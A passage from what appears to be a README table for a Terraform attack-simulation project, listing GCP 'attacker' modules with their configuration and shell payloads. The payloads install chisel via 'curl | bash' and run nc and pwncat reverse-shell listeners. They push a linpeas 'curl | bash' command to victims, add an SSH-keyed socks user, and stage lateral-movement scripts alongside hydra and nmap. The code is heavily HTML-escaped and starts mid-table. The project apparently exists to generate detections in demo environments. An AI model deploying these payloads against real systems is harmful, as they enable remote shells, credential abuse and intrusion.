script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| attacker-osconfig-responder-port-forward                | ./modules/osconfig/responder-port-forward             | osconfig_exec_responder_port_forward            | context.gcp.osconfig.attacker.responder.port_forward             | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "port_forward": {<br/>                            "enabled": false,<br/>                            "listen_port": 8888<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-port-forward             | <pre>locals &&#35;123;<br/>    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        killall &#45;9 chisel<br/>        truncate &#45;s 0 /tmp/chisel&#46;log<br/>        log &quot;checking for chisel&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v chisel; do<br/>            log &quot;chisel not found &#45; installing&quot;<br/>            curl https://i&#46;jpillora&#46;com/chisel&#33; &#124; bash<br/>            sleep 10<br/>        done<br/>        log &quot;chisel: $&&#35;40;command &#45;v  chisel&&#35;41;&quot;<br/>        /usr/local/bin/chisel server &#45;v &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125; &gt; /tmp/chisel&#46;log 2&gt;&amp;1 &amp;<br/>        log &quot;responder started&#46;&#46;&#46;&quot;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| attacker-osconfig-responder-reverse-shell               | ./modules/osconfig/responder-reverse-shell            | osconfig_exec_responder_reverse_shell           | context.gcp.osconfig.attacker.responder.reverse_shell            | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "reverse_shell": {<br/>                            "enabled": false,<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 4444,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell            | <pre>locals &&#35;123;<br/>    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    listen&&#35;95;ip = var&#46;inputs&&#35;91;&quot;listen&&#35;95;ip&quot;&&#35;93;<br/>    base64&&#35;95;command&&#35;95;payload = base64encode&&#35;40;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        screen &#45;S netcat &#45;X quit<br/>        screen &#45;wipe<br/>        truncate &#45;s 0 /tmp/netcat&#46;log<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/netcat&#46;log &#45;S netcat &#45;m nc &#45;vv &#45;nl $&&#35;123;local&#46;listen&&#35;95;ip&&#35;125; $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;<br/>        screen &#45;S netcat &#45;X colon &quot;logfile flush 0^M&quot;<br/>        log &quot;listener started&#46;&#46;&quot;<br/>        until tail /tmp/netcat&#46;log &#124; grep &#45;m 1 &quot;Connection received&quot;; do<br/>            log &quot;waiting for connection&#46;&#46;&#46;&quot;;<br/>            sleep 10;<br/>        done<br/>        sleep 30<br/>        log &&#35;x27;sending screen command: $&&#35;123;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;125;&&#35;x27;;<br/>        screen &#45;S netcat &#45;p 0 &#45;X stuff &quot;echo &&#35;x27;$&&#35;123;local&#46;base64&&#35;95;command&&#35;95;payload&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; /bin/bash &#45;^M&quot;<br/>        log &quot;responder started&#46;&#46;&#46;&quot;<br/>        log &&#35;x27;waiting 10 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 600<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-osconfig-responder-reverse-shell-multistage    | ./modules/osconfig/responder-reverse-shell-multistage | osconfig_exec_reverse_shell_multistage_attacker | context.gcp.osconfig.attacker.responder.reverse_shell_multistage | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "reverse_shell_multistage": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "iam2rds_role_name": "rds_user_access_role_ciemdemo",<br/>                            "iam2rds_session_name": "attacker-session",<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 4444,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell_host": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell-multistage | <pre>locals &&#35;123;<br/>    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    listen&&#35;95;ip = var&#46;inputs&&#35;91;&quot;listen&&#35;95;ip&quot;&&#35;93;<br/>    attack&&#35;95;dir = &quot;/pwncat&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    PWNCAT&&#35;95;LOG=&quot;/tmp/pwncat&#46;log&quot;<br/>    PWNCAT&&#35;95;SESSION=&quot;pwncat&quot;<br/>    PWNCAT&&#35;95;SESSION&&#35;95;LOCK=&quot;/tmp/pwncat&&#35;95;session&#46;lock&quot;<br/>    if &&#35;91; &#45;e &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot; &&#35;93;  &amp;&amp; screen &#45;ls &#124; grep &#45;q &quot;$PWNCAT&&#35;95;SESSION&quot;; then<br/>        log &quot;Pwncat session lock $PWNCAT&&#35;95;SESSION&&#35;95;LOCK exists and pwncat screen session running&#46; Skipping setup&#46;&quot;<br/>    else<br/>        rm &#45;f &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot;<br/>        log &quot;Session lock doesn&&#35;x27;t exist and screen session not runing&#46; Continuing&#46;&#46;&#46;&quot;<br/>        log &quot;setting up reverse shell listener: $&&#35;123;local&#46;listen&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;listen&&#35;95;port&&#35;125;&quot;<br/>        screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X quit<br/>        screen &#45;wipe<br/>        log &quot;cleaning app directory&quot;<br/>        rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>        mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/plugins $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/resources<br/>        cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;listener&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; listener&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;responder&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; plugins/responder&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;instance2rds&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/instance2rds&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;iam2rds&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/iam2rds&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;azureiam2azuresql&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/azureiam2azuresql&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;gcpiam2cloudsql&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/gcpiam2cloudsql&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;scan2kubeshell&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/scan2kubeshell&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;kube2s3&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/kube2s3&#46;sh <br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;iam2enum&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/iam2enum&#46;sh<br/>        log &quot;installing required python3&#46;9&#46;&#46;&#46;&quot;<br/>        apt&#45;get install &#45;y python3&#46;9 python3&#46;9&#45;venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        curl https://bootstrap&#46;pypa&#46;io/get&#45;pip&#46;py &#45;o get&#45;pip&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3&#46;9 get&#45;pip&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module&#46;&#46;&#46;&quot;<br/>        sleep 5<br/>        python3&#46;9 &#45;m pip install &#45;U pip setuptools wheel setuptools&&#35;95;rust jinja2 jc &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3&#46;9 &#45;m pip install &#45;U pwncat&#45;cs &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module&#46;&#46;&#46;&quot;<br/>        sleep 5<br/>        if &#33; &&#35;91; &#45;e /home/socksuser/&#46;ssh/socksuser&&#35;95;key &&#35;93;; then<br/>            log &quot;adding tunneled port scanning user &#45; socksuser&#46;&#46;&#46;&quot;<br/>            adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;socksuser&quot; &#124;&#124; log &quot;socksuser user already exists&quot;<br/>            log &quot;adding ssh keys for socks user&#46;&#46;&#46;&quot;<br/>            mkdir &#45;p /home/socksuser/&#46;ssh 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/>            ssh&#45;keygen &#45;t rsa &#45;N &&#35;x27;&&#35;x27; &#45;b 4096 &#45;f /home/socksuser/&#46;ssh/socksuser&&#35;95;key 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/>            cat /home/socksuser/&#46;ssh/socksuser&&#35;95;key&#46;pub &gt;&gt; /home/socksuser/&#46;ssh/authorized&&#35;95;keys 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/>            chown &#45;R socksuser:socksuser /home/socksuser<br/>            chmod 600 /home/socksuser/&#46;ssh/authorized&&#35;95;keys 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/>            log &quot;socksuser setup complete&#46;&#46;&#46;&quot;<br/>        fi<br/>        START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>        while true; do<br/>            for i in &&#35;96;seq $&&#35;40;&&#35;40;MAXLOG&#45;1&&#35;41;&&#35;41; &#45;1 1&&#35;96;; do mv &quot;$PWNCAT&&#35;95;LOG&#46;&quot;&&#35;123;$i,$&&#35;40;&&#35;40;i&#43;1&&#35;41;&&#35;41;&&#35;125; 2&gt;/dev/null &#124;&#124; true; done<br/>            mv $PWNCAT&&#35;95;LOG &quot;$PWNCAT&&#35;95;LOG&#46;1&quot; 2&gt;/dev/null &#124;&#124; true<br/>            log &quot;starting background process via screen&#46;&#46;&#46;&quot;<br/>            screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X quit<br/>            screen &#45;wipe<br/>            screen &#45;d &#45;L &#45;Logfile $PWNCAT&&#35;95;LOG &#45;S $PWNCAT&&#35;95;SESSION &#45;m /bin/bash &#45;c &quot;cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125; &amp;&amp; python3&#46;9 listener&#46;py &#45;&#45;port=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;port&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;host=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;host&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;payload=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;125;&&#35;92;&quot;&quot;<br/>            screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X colon &quot;logfile flush 0^M&quot;<br/>            log &quot;Checking for listener&#46;&#46;&#46;&quot;<br/>            TIMEOUT=1800<br/>            START&&#35;95;TIME=$&&#35;40;date &#43;%s&&#35;41;<br/>            while true; do<br/>                CURRENT&&#35;95;TIME=$&&#35;40;date &#43;%s&&#35;41;<br/>                ELAPSED&&#35;95;TIME=$&&#35;40;&&#35;40;CURRENT&&#35;95;TIME &#45; START&&#35;95;TIME&&#35;41;&&#35;41;<br/>                if grep &quot;listener created&quot; $PWNCAT&&#35;95;LOG; then<br/>                    log &quot;Found listener created log in $PWNCAT&&#35;95;LOG &#45; checking for port response&quot;<br/>                    while &#33; nc &#45;z &#45;w 5 &#45;vv 127&#46;0&#46;0&#46;1 $&&#35;123;local&#46;listen&&#35;95;port&&#35;125; &gt; /dev/null; do<br/>                        log &quot;failed check &#45; waiting for pwncat port response: 127&#46;0&#46;0&#46;1:$&&#35;123;local&#46;listen&&#35;95;port&&#35;125;&quot;;<br/>                        sleep 30;<br/>                        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                            break 3<br/>                        fi<br/>                    done;<br/>                    log &quot;Sucessfully connected to 127&#46;0&#46;0&#46;1:$&&#35;123;local&#46;listen&&#35;95;port&&#35;125;&quot;<br/>                    break<br/>                fi<br/>                if &&#35;91; $ELAPSED&&#35;95;TIME &#45;gt $TIMEOUT &&#35;93;; then<br/>                    log &quot;Failed to find listener created log for pwncat &#45; timeout after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>            done<br/>            log &quot;responder started&#46;&quot;<br/>            log &quot;starting sleep for 30 minutes &#45; blocking new tasks while accepting connections&#46;&#46;&#46;&quot;<br/>            sleep 1800<br/>            log &quot;sleep complete &#45; checking for running sessions&#46;&#46;&#46;&quot;<br/>            while &&#35;91; &#45;e &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot; &&#35;93;  &amp;&amp; screen &#45;ls &#124; grep &#45;q &quot;$PWNCAT&&#35;95;SESSION&quot;; do<br/>                log &quot;pwncat session still running &#45; waiting before restart&#46;&#46;&#46;&quot;<br/>                sleep 600<br/>            done<br/>            log &quot;no pwncat sessions found &#45; continuing&#46;&#46;&#46;&quot;<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            fi<br/>        done<br/>    fi<br/>    log &quot;done&#46;&quot;<br/>    EOT<br/><br/>    listener        = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/listener&#46;py&quot;&&#35;41;<br/>    responder       = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/responder&#46;py&quot;&&#35;41;<br/>    instance2rds    = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/instance2rds&#46;sh&quot;, <br/>                                &&#35;123;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;,<br/>                                    environment = var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;,<br/>                                    deployment = var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/><br/>    iam2rds         = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/iam2rds&#46;sh&quot;, <br/>                                &&#35;123;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;,<br/>                                    environment = var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;,<br/>                                    deployment = var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;,<br/>                                    iam2rds&&#35;95;role&&#35;95;name = var&#46;inputs&&#35;91;&quot;iam2rds&&#35;95;role&&#35;95;name&quot;&&#35;93;<br/>                                    iam2rds&&#35;95;session&&#35;95;name = &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;iam2rds&&#35;95;session&&#35;95;name&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    iam2enum = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/iam2enum&#46;sh&quot;&&#35;41;<br/>                            <br/>    azureiam2azuresql = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/azureiam2azuresql&#46;sh&quot;&&#35;41;                            <br/><br/>    gcpiam2cloudsql = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/gcpiam2cloudsql&#46;sh&quot;&&#35;41;<br/><br/>    scan2kubeshell = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/scan2kubeshell&#46;sh&quot;&&#35;41;<br/>    <br/>    kube2s3 = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/kube2s3&#46;sh&quot;&&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;proxychains4 nmap hydra python3&#45;pip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if &#33; command &#45;v proxychains4 &gt; /dev/null &#124;&#124; &#33; command &#45;v hydra &gt; /dev/null &#124;&#124; &#33; command &#45;v hydra &gt; /dev/null; then<br/>            yum update &#45;y<br/>            yum install &#45;y git<br/>            yum groupinstall &#45;y &&#35;x27;Development Tools&&#35;x27;<br/>            &#35; proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github&#46;com/rofl0r/proxychains&#45;ng<br/>            cd proxychains&#45;ng<br/>            &#46;/configure &amp;&amp; make &amp;&amp; make install<br/>            make install&#45;config<br/>            &#35; hydra<br/>            cd /usr/local/src<br/>            git clone https://github&#46;com/vanhauser&#45;thc/thc&#45;hydra<br/>            cd thc&#45;hydra<br/>            &#46;/configure &amp;&amp; make &amp;&amp; make install<br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;nmap python3&#45;pip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = 